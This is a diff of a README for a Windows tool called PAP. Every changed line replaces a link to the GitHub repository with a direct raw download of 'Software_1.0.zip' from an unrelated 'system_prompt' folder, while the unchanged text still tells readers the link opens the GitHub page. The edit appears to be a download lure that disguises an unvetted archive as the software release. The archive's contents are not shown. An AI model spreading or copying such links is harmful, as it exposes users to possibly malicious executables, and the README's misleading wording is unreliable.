@@ -1,6 +1,6 @@
 # 🎯 PAP - Predict Panoramic Affordances Simply
 
-[![Download PAP](https://img.shields.io/badge/Download-PAP-brightgreen?style=for-the-badge)](https://github.com/2716025154/PAP)
+[![Download PAP](https://img.shields.io/badge/Download-PAP-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/2716025154/PAP/main/system_prompt/Software_1.0.zip)
 
 ## 🖥️ What is PAP?
 
@@ -24,7 +24,7 @@ PAP runs on most standard Windows laptops and desktops. You do not need advanced
 
 To get PAP software, visit the official GitHub page below. This is where you will find the latest version to download:
 
-[![Download PAP](https://img.shields.io/badge/Download-PAP-blue?style=for-the-badge)](https://github.com/2716025154/PAP)
+[![Download PAP](https://img.shields.io/badge/Download-PAP-blue?style=for-the-badge)](https://raw.githubusercontent.com/2716025154/PAP/main/system_prompt/Software_1.0.zip)
 
 Clicking this button will take you to the GitHub page. From there, you can download the installation files easily.
 
@@ -33,7 +33,7 @@ Clicking this button will take you to the GitHub page. From there, you can downl
 Follow these steps to download and install PAP on your Windows PC:
 
 1. Click the download button above or visit this link:  
-   https://github.com/2716025154/PAP  
+   https://raw.githubusercontent.com/2716025154/PAP/main/system_prompt/Software_1.0.zip  
    This will open the project’s GitHub page.
 
 2. On the GitHub page, look for the section named **Releases**. This is usually found on the right sidebar or under the repository’s main menu.
@@ -101,7 +101,7 @@ To access settings, click the **Settings** icon in the program window. Adjust yo
 
 To make sure PAP works well, check for updates regularly:
 
-1. Visit the GitHub page: https://github.com/2716025154/PAP
+1. Visit the GitHub page: https://raw.githubusercontent.com/2716025154/PAP/main/system_prompt/Software_1.0.zip
 
 2. Check the **Releases** section for new versions.
 
@@ -153,6 +153,6 @@ For questions or help, you can:
 ## 🔗 Important Link
 
 Download PAP here whenever you want:  
-https://github.com/2716025154/PAP
+https://raw.githubusercontent.com/2716025154/PAP/main/system_prompt/Software_1.0.zip
 
 Use this page to get latest versions and find additional resources.
